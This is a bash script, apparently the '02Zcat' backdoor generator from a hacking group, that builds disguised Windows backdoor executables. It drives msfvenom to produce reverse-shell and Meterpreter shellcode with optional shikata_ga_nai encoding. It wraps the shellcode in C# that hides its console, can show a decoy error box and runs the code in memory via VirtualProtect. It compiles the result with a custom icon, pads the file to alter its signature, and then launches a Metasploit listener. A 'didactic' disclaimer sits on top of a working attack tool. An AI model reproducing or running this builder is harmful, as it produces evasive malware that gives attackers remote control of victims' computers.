#!/bin/bash
cat << !
────────────────────────────▄▀▄─────▄▀▄
───────────────────────────▄█░░▀▀▀▀▀░░█▄
───────────────────────▄▄──█░░░░░░░░░░░█──▄▄
──────────────────────█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█ 02Zcat
                                     0.2Zcat backdoor generator
                                     By: @Killerpop https://www.haxkur.ml/
!

echo -e '     \e[0;31mWARNING\e[0m'
cat << !
      This tool is created for didactic purposes and not to commit a crime. 
      Haxk.Ur does not take care of any malicious use of the tool. 
      We recommend the use in a controlled laboratory.       By Staff Haxk.Ur

!
sleep 2
# Check root
if [ "$(id -u)" != "0" ] > /dev/null 2>&1; then
echo -e '\e[0;31m【!!】 02Zcat root \e[0m' 1>&2
exit
fi
dir=`pwd`
rm $dir/rm -rf output
rm $dir/rm -rf \source
rm $dir/rm -rf handler
mkdir $dir/output
mkdir $dir/source
mkdir $dir/handler

# check msfconsole
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfconsole='1'
else
msfconsole='0' 
fi

# check msfvenom 
which msfvenom > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfvenom='1'
else
msfvenom='0'
fi

# check mono 
which mono > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
mono='1'
else
mono='0'
fi

# check mcs 
which mcs > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
mcs='1'
else
mcs='0'
fi

# check postgresql
which /etc/init.d/postgresql > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
postgresql='1'
else
postgresql='0'
fi 

# check fallocate
which fallocate > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
fallocate='1'
else
fallocate='0'
fi 

echo -n ===============> =;


sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ] && [ "$mono" == "1" ] && [ "$mcs" == "1" ] && [ "$postgresql" == "1" ] && [ "$fallocate" == "1" ]; then
echo -en "\b \e[1;33m100% Full\e[0m" 
echo ""
echo ""
echo -e '\e[0;31mmsfconsole\e[0m========>\e[1;33mOk\e[0m'
echo -e '\e[0;31mmsfvenom\e[0m==========>\e[1;33mOk\e[0m'
echo -e '\e[0;31mmono\e[0m==============>\e[1;33mOk\e[0m'
echo -e '\e[0;31mmsc\e[0m===============>\e[1;33mOk\e[0m'
echo -e '\e[0;31mpostgresql\e[0m========>\e[1;33mOk\e[0m'
echo -e '\e[0;31mfallocate\e[0m=========>\e[1;33mOk\e[0m'

echo ""
sleep 2
fi
if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ] || [ "$mono" == "0" ] || [ "$mcs" == "0" ] || [ "$postgresql" == "0" ] || [ "$fallocate" == "0" ]; then 
fail='1'
echo -en "\b \e[0;31m【Fail】\e[0m"
echo ""
echo ""
fi
if [ "$msfconsole" == "0" ] ;then 
echo -e 'msfconsole    \e[0;31m【!!】 Installed metasploit\e[0m';
fi
if [ "$msfvenom" == "0" ] ;then 
echo -e 'msfvenom      \e[0;31m【!!】 Install metasploit\e[0m';
fi
if [ "$mono" == "0" ] ;then
echo -e 'mono          \e[0;31m【!!】 Installed mono \e[0m';
fi
if [ "$mcs" == "0" ] ;then
echo -e 'mcs           \e[0;31m【!!】 Installed mono\e[0m';
fi
if [ "$postgresql" == "0" ] ;then
echo -e 'postgresql    \e[0;31m【!!】 Installed postgresql\e[0m';
fi
if [ "$fallocate" == "0" ] ;then
echo -e 'fallocate     \e[0;31m【!!】 Installed fallocate\e[0m';
fi
if [ "$fail" == "1" ]; then
echo ""
sleep 2
echo -e '\e[0;31mScript require dependencies\e[0m'
sleep 2
echo ""
echo -e '\e[0;31m***********ERROR***********\e[0m'
exit
fi

echo -e '\e[0;31m*******************************************\e' 
echo -e '\e[0;31m*     1-  Meterpreter_Reverse_tcp         *\e'
echo -e '\e[0;31m*     2-  Meterpreter_Reverse_http	  *\e'
echo -e '\e[0;31m*     3-  Meterpreter_Reverse_https	  *\e'
echo -e '\e[0;31m*     4-  Meterpreter_Reverse_tcp_dns     *\e'
echo -e '\e[0;31m*     5-  Shell_reverse_tcp               *\e'
echo -e '\e[0;31m*     6-  Powershell_reverse_tcp          *\e'
echo -e '\e[0;31m*     7-  Multi encode payload            *\e'
echo -e '\e[0;31m*******************************************\e'
echo ""
echo -e "\e[0;31m02Zcat\e[0m =>  \c"
read option

#Aukeratu 
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/powershell_reverse_tcp'
;;
7)
payload='windows/meterpreter/reverse_tcp'
echo -e "Enter the number of iterations: 1-500 : \c"
read int
;;
*)
echo -e '\e[0;31m***********ERROR***********\e[0m'
exit
;;
esac

#Encoder
case ${int#[+]} in
*[!0-9]* ) 
echo -e '\e[0;31m***********ERROR***********\e[0m'
exit
;;
* )
if [[ $int -gt 500 || $int = 0 ]]; then
echo -e '\e[0;31m【!!】 Invalid number, write a number between 1-500 \e[0m';
exit
fi 
;;
esac

#Ip
if [ "$option" == "4" ]; then
echo -e "\e[0;31mSet No-Ip Host\e[0m =>  \c"
read host
fi

echo -e "\e[0;31mLHOST\e[0m => \c"
read ip
if [[ "$ip" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
sleep 0.1
else
echo -e '\e[0;31m【!!】 Invalid LHOST\e[0m';
exit
fi

#Port
echo -e "\e[0;31mLPORT\e[0m => \c"
read port
case ${port#[+]} in
*[!0-9]* ) 
echo -e '\e[0;31m【!!】 Invalid LPORT \e[0m'
exit
;;
* )
if [[ $port -gt 65535 || $port = 0 ]]; then
echo -e '\e[0;31m【!!】 Invalid number, write a number between 1-65535 \e[0m';
exit
fi 
;;
esac

#ikonoa
echo -e "\e[0;31mIcon? y or n\e[0m =>  \c"
read icon
if [[ $icon != "y" && $icon != "n" ]]; then 
echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
exit
fi

#Mezua
echo -e "\e[0;31mDisplay an message? y or n\e[0m =>  \c"
read error
case $error in
y) 
echo -e "\e[0;31mTitle message\e[0m =>  \c"
read izenburua  
echo -e "\e[0;31mMessage\e[0m =>  \c"
read textua
;;
n)
;;
*)
echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
exit
;;
esac
echo -e "\e[0;31mEnter file name\e[0m =>  \c"
read izena
echo ""
echo -e "\e[0;31mPlease wait\e[0m"
if [ "$option" == "7" ]; then
msfvenom -p $payload LHOST=$ip LPORT=$port --platform windows -a x86 -e generic/none 2>/dev/null | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -i $int -f raw 2>/dev/null | msfvenom --platform windows -a x86 -e x86/fnstenv_mov -i $int -f hex >> behinbehineko 2>/dev/null;
encoded='Y'
fi
if [ "$option" == "4" ]; then
msfvenom -p $payload LHOST=$host LPORT=$port -f hex --smallest >> behinbehineko 2>/dev/null;
int='N'
encoded='N'
else
msfvenom -p $payload LHOST=$ip LPORT=$port -f hex --smallest >> behinbehineko 2>/dev/null;
int='N'
encoded='N'
fi
echo ""
sed 's/^/string HexadezimalKatea ="/' behinbehineko > behinbehineko1
sed 's/$/";/' behinbehineko1 > behinbehineko2
mv behinbehineko2 $dir/source/behinbehineko2
rm -f behinbehineko*
cd $dir/source/
echo "using System;" >> Kodea
echo "using System.Reflection;" >> Kodea
echo "using System.Runtime.InteropServices;" >> Kodea
if [ "$error" == "y" ]; then
echo "using System.Windows.Forms;" >> Kodea;
fi
echo "namespace zirikatu" >> Kodea
echo "{ class Program" >> Kodea
echo "{ [DllImport(\"kernel32.dll\", SetLastError = true)]" >> Kodea
echo "static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);" >> Kodea
echo "public delegate uint Ret1ArgDelegate(uint address);" >> Kodea
echo "static uint PlaceHolder1(uint arg1) { return 0; }" >> Kodea
echo "[DllImport(\"kernel32.dll\")]" >> Kodea
echo "static extern IntPtr GetConsoleWindow();" >> Kodea
echo "[DllImport(\"user32.dll\")]" >> Kodea
echo "static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" >> Kodea
echo "const int SW_HIDE = 0;" >> Kodea
echo "unsafe static void Main(string[] args)" >> Kodea
if [ "$error" == "y" ]; then
echo "{ MessageBox.Show(\"$textua\", \"$izenburua\",MessageBoxButtons.OK,MessageBoxIcon.Error);" >> Kodea
echo "var handle = GetConsoleWindow();" >> Kodea;
else
echo "{ var handle = GetConsoleWindow();" >> Kodea;
fi
echo "ShowWindow(handle, SW_HIDE);" >> Kodea
cat behinbehineko2 >> Kodea
rm -f behinbehineko2
echo "byte[] shellKodeahex = HexStringToByteArray(HexadezimalKatea);" >> Kodea
echo "burutu(shellKodeahex); }" >> Kodea
echo "public static byte[] HexStringToByteArray(String hexString)" >> Kodea
echo "{ byte[] retval = new byte[hexString.Length / 2];" >> Kodea
echo "for (int i = 0; i < hexString.Length; i += 2)" >> Kodea
echo "retval [i / 2] = Convert.ToByte (hexString.Substring (i, 2), 16);" >> Kodea
echo "return retval; }" >> Kodea
echo "unsafe public static void burutu(byte[] asmBytes)" >> Kodea
echo "{ fixed (byte* startAddress = &asmBytes[0])" >> Kodea
echo "{ Type delType = typeof(Delegate);" >> Kodea
echo "FieldInfo _methodPtr = delType.GetField(\"_methodPtr\", BindingFlags.NonPublic | BindingFlags.Instance);" >> Kodea
echo "Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);" >> Kodea
echo "_methodPtr.SetValue(del, (IntPtr) startAddress);" >> Kodea
echo "uint outOldProtection;" >> Kodea
echo "VirtualProtect((IntPtr) startAddress, (uint) asmBytes.Length, 0x40, out outOldProtection);" >> Kodea
echo "uint n = (uint)0x00000001;" >> Kodea
echo "n = del(n);" >> Kodea
echo "Console.WriteLine(\"{0:x}\", n);" >> Kodea
echo "Console.ReadKey();" >> Kodea
echo "}}}}" >> Kodea

#kompilatu
if [ "$icon" == "y" ] && [ "$error" == "n" ]; then 
mcs -platform:x86 -unsafe Kodea -win32icon:$dir/icon.ico -out:$dir/output/$izena.exe
elif [ "$icon" == "n" ] && [ "$error" == "y" ]; then
mcs -platform:x86 -unsafe Kodea -reference:System.Windows.Forms -out:$dir/output/$izena.exe
elif [ "$icon" == "n" ] && [ "$error" == "n" ]; then
mcs -platform:x86 -unsafe Kodea -out:$dir/output/$izena.exe
elif [ "$icon" == "y" ] && [ "$error" == "y" ]; then
mcs -platform:x86 -unsafe Kodea -win32icon:$dir/icon.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
fi

#aldaketa
tamainua=`stat -c %s $dir/output/$izena.exe`
offset=`echo $((512 + $RANDOM%512))`
luzeera=`echo $(($tamainua + $RANDOM%2000))`
fallocate -o $offset -l $luzeera $dir/output/$izena.exe

sleep 1
echo "===========================================================================>"
echo "=>"
echo "=>"
echo -e '=>    \e[0;31mCONGRATULATIONS  Back Door generated Happy hacking.....!!\e[0m'
echo "=>"
echo "=>    BACKDOOR FILE= $dir/output/$izena.exe"
echo "=>    BACKDOOR SIZE= `stat -c %s $dir/output/$izena.exe` Bytes"
echo "=>    LHOST=$ip"
echo "=>    LPORT=$port"         
echo "=>    ENCODED =$encoded" 
echo "=>    PAYLOAD=${payload^^}"	       
echo "=>    NUMBER OF ITERATIONS=$int"
echo "=>    ICON=${icon^^}"
echo "=>    MESSAGE=${error^^}"
echo "=>"
echo "=>"
echo "===========================================================================>"
sleep 2
echo -e "\e[0;31mStart handler? y or n\e[0m => \c"
read handler
if [ "$handler" == "y" ]; then
echo "use exploit/multi/handler" >> $dir/handler/handler.rc
echo "set PAYLOAD $payload" >> $dir/handler/handler.rc
echo "set LHOST $ip" >> $dir/handler/handler.rc
echo "set LPORT $port" >> $dir/handler/handler.rc
echo "set EXITONSESSION false" >> $dir/handler/handler.rc
echo "exploit -j" >> $dir/handler/handler.rc
/etc/init.d/postgresql start
msfconsole -r $dir/handler/handler.rc
sleep 2
else
echo -e '\e[0;31mExit==========>\e[0m'
sleep 1
exit
fi
